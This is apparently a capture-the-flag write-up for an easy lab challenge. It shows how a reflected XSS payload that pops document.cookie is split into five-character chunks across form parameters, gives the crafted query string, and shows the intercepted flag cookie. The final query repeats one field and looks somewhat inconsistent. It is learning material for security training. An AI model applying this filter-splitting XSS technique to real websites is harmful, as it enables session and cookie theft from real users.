---
Name: "Retrogenesis"
Category: "Security Summer School"
Difficulty: "Easy"
Description: "Assembling a constrained XSS payload across multiple request parameters."
---

# Retrogenesis
First labeled each input field and looked at the request
```http
&field411=a15&field412=a16&field413=a17&field414=a18&field422=a19&field421=a20&field424=a21&field423=a22&field433=a23&field431=a24&field434=a25&field432=a26&field444=a27&field443=a28&field442=a29&field441=a39
```

The concatenated string resulted on the website
```html
a15a23a21a18a22a19a24a28
```

Since we can only send a maximul nr of 5 chars we split the payload
```txt
<scri
pt>al
ert(d
ocume
nt.co
okie)
</scr
ipt>
```

Then matching the fields results into
```http
?field411=<scri&field422=okie)&field422=okie)&field433=pt>al&field431=</scr&field443=ipt>&field424=ert(d&field414=ocume&field423=nt.co
```

The flag did not want to display in the pop up, and saw this error
```
Cookie “flag” has been rejected because a non-HTTPS cookie can’t be set as “secure”.
```

Now I realised I can intercept the server request with burp, and there it was

```http
Set-Cookie: flag="SSS{retr0_music_for_the_masses}"; HttpOnly; Path=/; SameSite=Lax; Secure
Set-Cookie: csrftoken=8XXxua2QKrKvwzYoW1y4oWQfBMH1rSIqo2Hdh1zlYo2bBQM6FVaSqZCcD4lF1NJY; expires=Tue, 06 Jul 2027 16:49:54 GMT; Max-Age=31449600; Path=/; SameSite=Lax
```

```txt
SSS{retr0_music_for_the_masses}
```

---

